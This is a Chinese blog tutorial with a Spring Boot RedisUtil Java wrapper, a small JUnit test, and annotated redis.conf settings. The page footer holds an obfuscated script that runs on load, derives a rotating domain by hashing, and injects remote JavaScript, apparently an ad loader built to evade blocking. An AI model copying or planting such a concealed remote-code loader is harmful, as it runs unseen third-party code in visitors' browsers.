<h2 id="RedisUtil%E5%B0%81%E8%A3%85%E5%B7%A5%E5%85%B7%E7%B1%BB">RedisUtil封装工具类</h2> 
<pre><code class="language-java">import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.stereotype.Component;
import org.springframework.util.CollectionUtils;

import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.TimeUnit;

@Component
public final class RedisUtil {

    @Autowired
    private RedisTemplate&lt;String, Object&gt; redisTemplate;

    // =============================common============================
    /**
     * 指定缓存失效时间
     * @param key  键
     * @param time 时间(秒)
     */
    public boolean expire(String key, long time) {
        try {
            if (time &gt; 0) {
                redisTemplate.expire(key, time, TimeUnit.SECONDS);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    /**
     * 根据key 获取过期时间
     * @param key 键 不能为null
     * @return 时间(秒) 返回0代表为永久有效
     */
    public long getExpire(String key) {
        return redisTemplate.getExpire(key, TimeUnit.SECONDS);
    }


    /**
     * 判断key是否存在
     * @param key 键
     * @return true 存在 false不存在
     */
    public boolean hasKey(String key) {
        try {
            return redisTemplate.hasKey(key);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 删除缓存
     * @param key 可以传一个值 或多个
     */
    @SuppressWarnings("unchecked")
    public void del(String... key) {
        if (key != null &amp;&amp; key.length &gt; 0) {
            if (key.length == 1) {
                redisTemplate.delete(key[0]);
            } else {
                redisTemplate.delete(CollectionUtils.arrayToList(key));
            }
        }
    }


    // ============================String=============================

    /**
     * 普通缓存获取
     * @param key 键
     * @return 值
     */
    public Object get(String key) {
        return key == null ? null : redisTemplate.opsForValue().get(key);
    }

    /**
     * 普通缓存放入
     * @param key   键
     * @param value 值
     * @return true成功 false失败
     */

    public boolean set(String key, Object value) {
        try {
            redisTemplate.opsForValue().set(key, value);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 普通缓存放入并设置时间
     * @param key   键
     * @param value 值
     * @param time  时间(秒) time要大于0 如果time小于等于0 将设置无限期
     * @return true成功 false 失败
     */

    public boolean set(String key, Object value, long time) {
        try {
            if (time &gt; 0) {
                redisTemplate.opsForValue().set(key, value, time, TimeUnit.SECONDS);
            } else {
                set(key, value);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 递增
     * @param key   键
     * @param delta 要增加几(大于0)
     */
    public long incr(String key, long delta) {
        if (delta &lt; 0) {
            throw new RuntimeException("递增因子必须大于0");
        }
        return redisTemplate.opsForValue().increment(key, delta);
    }


    /**
     * 递减
     * @param key   键
     * @param delta 要减少几(小于0)
     */
    public long decr(String key, long delta) {
        if (delta &lt; 0) {
            throw new RuntimeException("递减因子必须大于0");
        }
        return redisTemplate.opsForValue().increment(key, -delta);
    }


    // ================================Map=================================

    /**
     * HashGet
     * @param key  键 不能为null
     * @param item 项 不能为null
     */
    public Object hget(String key, String item) {
        return redisTemplate.opsForHash().get(key, item);
    }

    /**
     * 获取hashKey对应的所有键值
     * @param key 键
     * @return 对应的多个键值
     */
    public Map&lt;Object, Object&gt; hmget(String key) {
        return redisTemplate.opsForHash().entries(key);
    }

    /**
     * HashSet
     * @param key 键
     * @param map 对应多个键值
     */
    public boolean hmset(String key, Map&lt;String, Object&gt; map) {
        try {
            redisTemplate.opsForHash().putAll(key, map);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * HashSet 并设置时间
     * @param key  键
     * @param map  对应多个键值
     * @param time 时间(秒)
     * @return true成功 false失败
     */
    public boolean hmset(String key, Map&lt;String, Object&gt; map, long time) {
        try {
            redisTemplate.opsForHash().putAll(key, map);
            if (time &gt; 0) {
                expire(key, time);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 向一张hash表中放入数据,如果不存在将创建
     *
     * @param key   键
     * @param item  项
     * @param value 值
     * @return true 成功 false失败
     */
    public boolean hset(String key, String item, Object value) {
        try {
            redisTemplate.opsForHash().put(key, item, value);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    /**
     * 向一张hash表中放入数据,如果不存在将创建
     *
     * @param key   键
     * @param item  项
     * @param value 值
     * @param time  时间(秒) 注意:如果已存在的hash表有时间,这里将会替换原有的时间
     * @return true 成功 false失败
     */
    public boolean hset(String key, String item, Object value, long time) {
        try {
            redisTemplate.opsForHash().put(key, item, value);
            if (time &gt; 0) {
                expire(key, time);
            }
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 删除hash表中的值
     *
     * @param key  键 不能为null
     * @param item 项 可以使多个 不能为null
     */
    public void hdel(String key, Object... item) {
        redisTemplate.opsForHash().delete(key, item);
    }


    /**
     * 判断hash表中是否有该项的值
     *
     * @param key  键 不能为null
     * @param item 项 不能为null
     * @return true 存在 false不存在
     */
    public boolean hHasKey(String key, String item) {
        return redisTemplate.opsForHash().hasKey(key, item);
    }


    /**
     * hash递增 如果不存在,就会创建一个 并把新增后的值返回
     *
     * @param key  键
     * @param item 项
     * @param by   要增加几(大于0)
     */
    public double hincr(String key, String item, double by) {
        return redisTemplate.opsForHash().increment(key, item, by);
    }


    /**
     * hash递减
     *
     * @param key  键
     * @param item 项
     * @param by   要减少记(小于0)
     */
    public double hdecr(String key, String item, double by) {
        return redisTemplate.opsForHash().increment(key, item, -by);
    }


    // ============================set=============================

    /**
     * 根据key获取Set中的所有值
     * @param key 键
     */
    public Set&lt;Object&gt; sGet(String key) {
        try {
            return redisTemplate.opsForSet().members(key);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    /**
     * 根据value从一个set中查询,是否存在
     *
     * @param key   键
     * @param value 值
     * @return true 存在 false不存在
     */
    public boolean sHasKey(String key, Object value) {
        try {
            return redisTemplate.opsForSet().isMember(key, value);
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 将数据放入set缓存
     *
     * @param key    键
     * @param values 值 可以是多个
     * @return 成功个数
     */
    public long sSet(String key, Object... values) {
        try {
            return redisTemplate.opsForSet().add(key, values);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }


    /**
     * 将set数据放入缓存
     *
     * @param key    键
     * @param time   时间(秒)
     * @param values 值 可以是多个
     * @return 成功个数
     */
    public long sSetAndTime(String key, long time, Object... values) {
        try {
            Long count = redisTemplate.opsForSet().add(key, values);
            if (time &gt; 0)
                expire(key, time);
            return count;
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }


    /**
     * 获取set缓存的长度
     *
     * @param key 键
     */
    public long sGetSetSize(String key) {
        try {
            return redisTemplate.opsForSet().size(key);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }


    /**
     * 移除值为value的
     *
     * @param key    键
     * @param values 值 可以是多个
     * @return 移除的个数
     */

    public long setRemove(String key, Object... values) {
        try {
            Long count = redisTemplate.opsForSet().remove(key, values);
            return count;
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }

    // ===============================list=================================

    /**
     * 获取list缓存的内容
     *
     * @param key   键
     * @param start 开始
     * @param end   结束 0 到 -1代表所有值
     */
    public List&lt;Object&gt; lGet(String key, long start, long end) {
        try {
            return redisTemplate.opsForList().range(key, start, end);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    /**
     * 获取list缓存的长度
     *
     * @param key 键
     */
    public long lGetListSize(String key) {
        try {
            return redisTemplate.opsForList().size(key);
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }
    }


    /**
     * 通过索引 获取list中的值
     *
     * @param key   键
     * @param index 索引 index&gt;=0时， 0 表头，1 第二个元素，依次类推；index&lt;0时，-1，表尾，-2倒数第二个元素，依次类推
     */
    public Object lGetIndex(String key, long index) {
        try {
            return redisTemplate.opsForList().index(key, index);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    /**
     * 将list放入缓存
     *
     * @param key   键
     * @param value 值
     */
    public boolean lSet(String key, Object value) {
        try {
            redisTemplate.opsForList().rightPush(key, value);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 将list放入缓存
     * @param key   键
     * @param value 值
     * @param time  时间(秒)
     */
    public boolean lSet(String key, Object value, long time) {
        try {
            redisTemplate.opsForList().rightPush(key, value);
            if (time &gt; 0)
                expire(key, time);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }

    }


    /**
     * 将list放入缓存
     *
     * @param key   键
     * @param value 值
     * @return
     */
    public boolean lSet(String key, List&lt;Object&gt; value) {
        try {
            redisTemplate.opsForList().rightPushAll(key, value);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }

    }


    /**
     * 将list放入缓存
     *
     * @param key   键
     * @param value 值
     * @param time  时间(秒)
     * @return
     */
    public boolean lSet(String key, List&lt;Object&gt; value, long time) {
        try {
            redisTemplate.opsForList().rightPushAll(key, value);
            if (time &gt; 0)
                expire(key, time);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 根据索引修改list中的某条数据
     *
     * @param key   键
     * @param index 索引
     * @param value 值
     * @return
     */

    public boolean lUpdateIndex(String key, long index, Object value) {
        try {
            redisTemplate.opsForList().set(key, index, value);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }


    /**
     * 移除N个值为value
     *
     * @param key   键
     * @param count 移除多少个
     * @param value 值
     * @return 移除的个数
     */

    public long lRemove(String key, long count, Object value) {
        try {
            Long remove = redisTemplate.opsForList().remove(key, count, value);
            return remove;
        } catch (Exception e) {
            e.printStackTrace();
            return 0;
        }

    }

}</code></pre> 
<h2 id="%E6%B5%8B%E8%AF%95%E7%B1%BB">测试类</h2> 
<pre><code class="language-java">import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.data.redis.core.RedisTemplate;

@SpringBootTest
class SpringbootRedisApplicationTests {

    @Autowired
    @Qualifier("redisTemplate")
    private RedisTemplate redisTemplate;

    @Autowired
    private RedisUtil redisUtil;
    
    @Test
    public void test1() {
        redisUtil.set("myKey","myValue");
        System.out.println(redisUtil.get("myKey"));
    }

}</code></pre> 
<h1 id="Redis.conf%E8%AF%A6%E8%A7%A3">八、Redis.conf详解</h1> 
<p>启动时通过配置文件来启动的</p> 
<blockquote> 
 <p>&gt; redis-server xx/xx/redis.conf</p> 
</blockquote> 
<h3 id="%E5%8D%95%E4%BD%8D">单位</h3> 
<p><img alt="" height="447" src="https://images2.imgbox.com/d2/e3/4s9X0hrf_o.png" width="916"></p> 
<h3 id="%E5%8C%85%E5%90%AB">包含</h3> 
<p><img alt="" height="364" src="https://images2.imgbox.com/8c/90/QIbnA9z0_o.png" width="899"></p> 
<h3 id="%E7%BD%91%E7%BB%9C">网络</h3> 
<blockquote> 
 <p>bind 127.0.0.1  #绑定的ip</p> 
 <p>protected-mode yes  #保护模式，默认开启的</p> 
 <p>port 6379    #端口设置</p> 
</blockquote> 
<h3 id="%E9%80%9A%E7%94%A8GENERAL" style="background-color:transparent">通用GENERAL</h3> 
<blockquote> 
 <p>daemonize yes  #以守护进程的方式运行（后台运行），默认是no，需要我们自己开启为yes</p> 
 <p><img alt="" height="299" src="https://images2.imgbox.com/ab/4b/73bcYshq_o.png" width="919"></p> 
 <p>logfile ""      <strong>  #日志的文件位置名，为空表示标准的输出</strong></p> 
 <p>databases 16   <strong> #数据库的数量，默认是16个数据库</strong><br> always-show-logo yes   <strong>  # 是否总是显示LoGo</strong></p> 
</blockquote> 
<h3 id="%E5%BF%AB%E7%85%A7">快照</h3> 
<blockquote> 
 <p><strong>持久化，在规定的时间内，执行了多少次操作，则会持久化到文件.rdb. aof</strong></p> 
 <p><strong>redis是内存数据库，如果没有持久化，那么数据断电及失!</strong><br> #如果900s内，如果至少有一个1 key进行了修改，我们及进行持久化操作</p> 
 <p><strong>save 900 1</strong><br> #如果300s内，如果至少10 key进行了修改，我们及进行持久化操作</p> 
 <p><strong>save 300 10</strong><br> # 如果60s内，如果至少10000 key进行了修改，我们及进行持久化操作</p> 
 <p><strong>save 60 10000</strong><br> #我们之后学习持久化，会自己定义这个测试!</p> 
 <p></p> 
 <p>stop-writes-on-bgsave-error yes  <strong>#持久化如果出错，是否还需要继续工作!</strong><br> rdbcompression yes  <strong># 是否压缩rdb文件，需要消耗一些cpu资源!</strong><br> rdbchecksum yes <strong>#保存rdb文件的时候，进行错误的检查校验!</strong><br> dir./  <strong> #rdb文件保存的目录!</strong></p> 
</blockquote> 
<h3 id="REPLICATION%E5%A4%8D%E5%88%B6">REPLICATION复制</h3> 
<p>我们后面讲解主从复制的，时候再进行讲解</p> 
<h3 id="SECURITY%E5%AE%89%E5%85%A8">SECURITY安全</h3> 
<blockquote> 
 <p>#requirepas  foobared   可以在这里<strong>设置redis的密码</strong>，默认是没有密码!<br><img alt="" height="453" src="https://images2.imgbox.com/61/4c/AdpB6BnH_o.png" width="763"></p> 
</blockquote> 
<h3 id="CLIENTS%E9%99%90%E5%88%B6">CLIENTS限制</h3> 
<blockquote> 
 <p>maxclients 10000  <strong>#设置能连接上redis的最大客户端的数量</strong><br> maxmemory &lt;bytes&gt;  <strong> #redis 配置最大的内存容量</strong><br> maxmemory-policy noeviction <strong>#内存到达上限之后的处理策略</strong></p> 
 <ul>
<li>1、volatile-lru:只对设置了过期时间的key进行LRU（默认值）</li>
<li>2、allkeys-lru :删除lru算法的key</li>
<li>3、volatile-random:随机删除即将过期key</li>
<li>4、allkeys-random:随机删除</li>
<li>5、volatile-ttl :删除即将过期的</li>
<li>6、noeviction :永不过期，返回错误</li>
</ul> 
</blockquote> 
<h3 id="APPEND%20ONLY%20%E6%A8%A1%E5%BC%8Faof%E9%85%8D%E7%BD%AE">APPEND ONLY 模式aof配置</h3> 
<blockquote> 
 <p>appendonly no     <strong>#默认是不开启aof模式的，默认是使用rdb方式持久化的，在大部分所有的情况下，rdb完全够用!</strong></p> 
 <p>appendfilename "appendonly.aof"    <strong> #持久化的文件的名字</strong></p> 
 <p></p> 
 <p>#appendFsync always    #每次修改都会sync。消耗性能<br> appendfsync everysec    #每秒执行一次 sync，可能会丢失这1s的数据!<br> # appendfsync no      #不执行sync，这个时候操作系统自己同步数据，速度最快!</p> 
 <p><br> 具体的配置，在 Redis持久化中去给大家详细详解! </p> 
</blockquote> 
<h3>
<br>  </h3> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p> 
<p></p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>